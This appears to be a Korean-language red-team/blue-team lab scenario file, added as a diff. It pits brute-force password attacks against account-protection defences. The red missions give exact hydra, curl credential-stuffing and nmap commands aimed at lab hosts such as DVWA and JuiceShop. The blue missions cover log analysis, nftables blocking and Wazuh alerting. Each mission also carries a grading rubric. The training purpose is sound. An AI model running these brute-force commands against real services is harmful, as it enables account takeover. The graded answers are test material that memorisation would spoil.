@@ -1,0 +1,277 @@
+id: "bruteforce-vs-lockout"
+title: "패스워드 공격 vs 계정 보호"
+description: "다크웹에서 유출된 크리덴셜 목록이 발견되었고, 공격자가 이를 이용해 무차별 대입 공격을 시도할 것으로 예상된다. Red Team은 hydra를 사용하여 다양한 서비스의 인증을 돌파해야 한다. Blue Team은 로그인 실패를 실시간 모니터링하고, 자동 차단 메커니즘을 구축하여 계정을 보호해야 한다."
+difficulty: "medium"
+time_limit: 2700
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "hydra를 사용하여 DVWA(http://10.20.30.80:8080) 로그인 페이지에 브루트포스 공격을 수행하라. 사용자명 admin을 대상으로 한다."
+    hint: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.30.80 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=test' -t 4 -W 1 -f"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "hydra"
+      semantic:
+        intent: "MITRE T1110.001 (Brute Force: Password Guessing) — DVWA brute force endpoint 의 GET form 인증 우회. hydra 의 http-get-form 모듈."
+        success_criteria:
+          - "hydra -l <user> -P <wordlist> URL http-get-form '<path>:<params>:<failmsg>:H=<cookie>'"
+          - "쿠키 (security=low + PHPSESSID) 헤더 동봉"
+          - "응답에 hydra 진행 표시 또는 [HOST] 발견 라인"
+        acceptable_methods:
+          - "hydra http-get-form / http-post-form"
+          - "patator http_fuzz"
+          - "wfuzz / ffuf -X POST"
+          - "Burp Intruder (수동)"
+        negative_signs:
+          - "쿠키 누락 → 모든 시도 실패 (false negative)"
+          - "-t 100 너무 높음 (rate limit 즉시 trigger)"
+          - "fail message 잘못 → false positive 가득"
+
+  - order: 2
+    instruction: "nmap 스크립트를 사용하여 SSH 서비스(10.20.30.80)에 대한 인증 방식을 확인하라."
+    hint: "nmap --script ssh-auth-methods -p 22 10.20.30.80 --max-retries 1 --host-timeout 15s -T4"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "ssh-auth-methods"
+      semantic:
+        intent: "Pre-attack — SSH 인증 방식 (password / publickey / keyboard-interactive) 식별. password 만 활성이면 brute force 가능."
+        success_criteria:
+          - "nmap --script ssh-auth-methods -p 22"
+          - "응답에 publickey/password/keyboard-interactive 중 1개 이상"
+          - "(보너스) password 활성화 여부 명시"
+        acceptable_methods:
+          - "nmap --script ssh-auth-methods"
+          - "ssh -vv user@host 2>&1 | grep authentications"
+          - "ssh-audit (전용 도구)"
+        negative_signs:
+          - "auth method 식별 없이 brute force 바로 시도"
+
+  - order: 3
+    instruction: "hydra로 SSH 서비스(10.20.30.80)에 대해 일반적인 계정/패스워드 조합으로 사전 공격을 수행하라."
+    hint: "hydra -L /usr/share/nmap/nselib/data/usernames.lst -P /usr/share/nmap/nselib/data/passwords.lst 10.20.30.80 ssh -t 4 -W 2 -f -V 2>&1 | head -30"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "hydra"
+      semantic:
+        intent: "MITRE T1110.001 SSH brute — username + password list 조합 사전 공격. -t 4 는 lab 안전 (실제 운영에선 차단 정책 필요)."
+        success_criteria:
+          - "hydra -L <userlist> -P <passlist> URL ssh"
+          - "-t 4 (parallel limit) + -f (성공 시 종료)"
+          - "응답에 hydra 진행 + 시도 횟수"
+        acceptable_methods:
+          - "hydra ssh"
+          - "medusa -h <host> -U userlist -P passlist -M ssh"
+          - "ncrack ssh://host"
+          - "password_attack skill (전용)"
+        negative_signs:
+          - "단일 계정만 (-l user) + list 활용 안 함"
+          - "-t 50+ (DoS 동시 trigger)"
+
+  - order: 4
+    instruction: "JuiceShop의 로그인 API에 대해 curl을 이용한 credential stuffing을 시뮬레이션하라."
+    hint: "for pass in admin123 password 1234 admin password1; do curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"admin@juice-sh.op\\\",\\\"password\\\":\\\"$pass\\\"}\" ; echo; done"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "Invalid"
+      semantic:
+        intent: "MITRE T1110.004 (Credential Stuffing) — 알려진 leaked credential list 로 multi-account 시도. brute 보다 효율적 (실제 사용자 password 사용)."
+        success_criteria:
+          - "for loop + curl POST + JSON body + 5+ password"
+          - "응답에 Invalid (실패) 또는 token (성공)"
+          - "성공 password 추출"
+        acceptable_methods:
+          - "for + curl"
+          - "hydra http-post-form (JSON 모드)"
+          - "patator + JSON"
+          - "python concurrent.futures"
+        negative_signs:
+          - "단일 password 만 + list 시도 안 함"
+          - "응답 status 분석 없이 dump"
+
+  - order: 5
+    instruction: "whatweb을 사용하여 로그인 페이지의 보안 메커니즘(CSRF 토큰, 캡차 등)을 확인하라."
+    hint: "whatweb http://10.20.30.80:8080/login.php -v"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "http://10.20.30.80"
+      semantic:
+        intent: "MITRE T1592.002 — login page 의 CSRF token / CAPTCHA / rate limit 검사. 활성 시 brute force 무력화. recon 단계."
+        success_criteria:
+          - "whatweb URL -v"
+          - "응답에 form fields + CSRF/CAPTCHA 식별"
+          - "(보너스) Set-Cookie의 csrftoken / X-CSRF-Token 헤더"
+        acceptable_methods:
+          - "whatweb -v"
+          - "curl -I + grep CSRF/csrftoken"
+          - "browser DevTools Network tab"
+        negative_signs:
+          - "URL echo 만 + 보안 메커니즘 식별 없음"
+
+  - order: 6
+    instruction: "nmap으로 대상 호스트의 SSH, HTTP 서비스 버전 정보를 수집하여 알려진 취약점이 있는지 확인하라."
+    hint: "nmap -sV --script=vulners -p 22,80,3000,8080 10.20.30.80 --max-retries 1 --host-timeout 15s -T4"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "open"
+      semantic:
+        intent: "vulners NSE — service version → CVE 자동 매핑. brute force 외 alternative 공격 경로 (CVE exploit)."
+        success_criteria:
+          - "nmap -sV --script=vulners"
+          - "응답에 service version + CVE-NNNN-NNNN 매핑"
+          - "최소 1개 known CVE 식별 (또는 없음 보고)"
+        acceptable_methods:
+          - "nmap --script=vulners"
+          - "nmap --script=vuln (전체 vuln 카테고리)"
+          - "searchsploit + 수동 CVE 매핑"
+          - "cve_lookup skill (전용)"
+        negative_signs:
+          - "version 만 + CVE 매핑 안 함"
+
+blue_missions:
+  - order: 1
+    instruction: "Apache 접근 로그에서 로그인 시도 실패 패턴을 분석하라."
+    hint: "grep -i 'login\\|brute\\|POST' /var/log/apache2/access.log | tail -30"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "POST"
+      semantic:
+        intent: "Apache access.log 의 로그인 endpoint POST 횟수 분석. 정상 baseline 대비 비정상 (분당 100+ POST) 식별."
+        success_criteria:
+          - "access.log grep login/brute/POST"
+          - "POST + /login + status code"
+          - "source IP + POST 횟수 분석"
+        acceptable_methods:
+          - "grep + tail"
+          - "awk '$6 ~ /POST/' (method 필터)"
+          - "GoAccess (시각화)"
+          - "ELK Discover query"
+        negative_signs:
+          - "전체 dump + 시간순/IP 분석 없음"
+
+  - order: 2
+    instruction: "SSH 인증 실패 로그에서 브루트포스 공격 흔적을 확인하라."
+    hint: "grep 'Failed password' /var/log/auth.log | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "Failed"
+      semantic:
+        intent: "auth.log 의 'Failed password for' line 분석 — source IP + user + 시도 횟수. SSH brute force 의 직접 신호."
+        success_criteria:
+          - "/var/log/auth.log grep 'Failed password'"
+          - "source IP + invalid user 추출"
+          - "(보너스) IP 별 시도 횟수 정렬"
+        acceptable_methods:
+          - "grep + tail"
+          - "lastb (실패 list)"
+          - "journalctl -u sshd | grep Failed"
+          - "fail2ban-client status"
+        negative_signs:
+          - "Failed 만 dump + IP 분석 없음"
+          - "Accepted (정상) 까지 포함"
+
+  - order: 3
+    instruction: "nftables로 공격자 IP(10.20.30.201)의 SSH 접근을 차단하라."
+    hint: "nft add rule inet filter input ip saddr 10.20.30.201 tcp dport 22 drop"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "Targeted block — attacker IP 의 SSH 접근만 차단. 다른 service (HTTP) 는 유지. precise containment."
+        success_criteria:
+          - "nft add rule + ip saddr <attacker> + tcp dport 22 + drop"
+          - "rule 적용 후 nft list"
+          - "log prefix (선택)"
+        acceptable_methods:
+          - "nft add rule"
+          - "iptables -I INPUT -s <ip> -p tcp --dport 22 -j DROP"
+          - "fail2ban (자동)"
+          - "configure_nftables skill"
+        negative_signs:
+          - "전체 IP 차단 (다른 service 도 끊김)"
+          - "drop 만 + log 누락 → 추적 불가"
+
+  - order: 4
+    instruction: "nftables에 SSH 포트에 대한 rate limiting 룰을 추가하라 (분당 5회 제한)."
+    hint: "nft add rule inet filter input tcp dport 22 ct state new limit rate 5/minute accept"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "Generic rate limit — 모든 source IP 의 SSH new connection 분당 5회 제한. brute force 자동 차단 (legitimate 영향 최소)."
+        success_criteria:
+          - "nft add rule + ct state new + limit rate 5/minute"
+          - "tcp dport 22"
+          - "초과 시 drop 룰 추가 (또는 default deny)"
+        acceptable_methods:
+          - "nft + limit rate"
+          - "iptables -m limit"
+          - "iptables -m recent (slidng window)"
+          - "fail2ban DEFAULT.maxretry"
+        negative_signs:
+          - "rate 너무 낮음 (1/min — legitimate user 차단)"
+          - "ct state new 누락 (기존 connection 도 영향)"
+
+  - order: 5
+    instruction: "Wazuh에서 브루트포스 관련 알림(룰 ID 5710, 5712 등)을 확인하라."
+    hint: "grep -E '5710|5712|brute' /var/ossec/logs/alerts/alerts.json | tail -20"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "alert"
+      semantic:
+        intent: "Wazuh sshd brute force rule (5710 invalid user / 5712 multiple failures) 매칭. SIEM level 자동 detection."
+        success_criteria:
+          - "alerts.json grep 5710/5712/brute"
+          - "최소 1개 alert + agent + source IP"
+          - "rule.level 분류 (10+ critical)"
+        acceptable_methods:
+          - "grep + tail alerts.json"
+          - "jq '.rule.id == 5710 or .rule.id == 5712' alerts.json"
+          - "Wazuh API: GET /security/agents/<id>/alerts?q=rule.id:5710"
+        negative_signs:
+          - "alerts.json 비어있음 → Wazuh sshd decoder 미적용"
+          - "raw alert dump"
+
+  - order: 6
+    instruction: "Wazuh에서 SSH 브루트포스 탐지 시 자동 IP 차단을 위한 active-response 설정을 확인하라."
+    hint: "cat /var/ossec/etc/ossec.conf | grep -A 10 'active-response'"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "active-response"
+      semantic:
+        intent: "Wazuh active-response — 자동 IP 차단 (firewall-drop / host-deny). 운영 환경의 가장 효율적 brute force 차단."
+        success_criteria:
+          - "/var/ossec/etc/ossec.conf 의 <active-response> 섹션"
+          - "<command>firewall-drop</command> 또는 host-deny"
+          - "<location> + <rules_id> 5710/5712 매핑 확인"
+        acceptable_methods:
+          - "cat ossec.conf + grep -A active-response"
+          - "Wazuh API: GET /manager/configuration?section=active-response"
+          - "/var/ossec/active-response/bin/firewall-drop 직접 검사"
+        negative_signs:
+          - "active-response 미설정 (manual 차단만)"
+          - "rules_id 매핑 누락 (trigger 안 됨)"
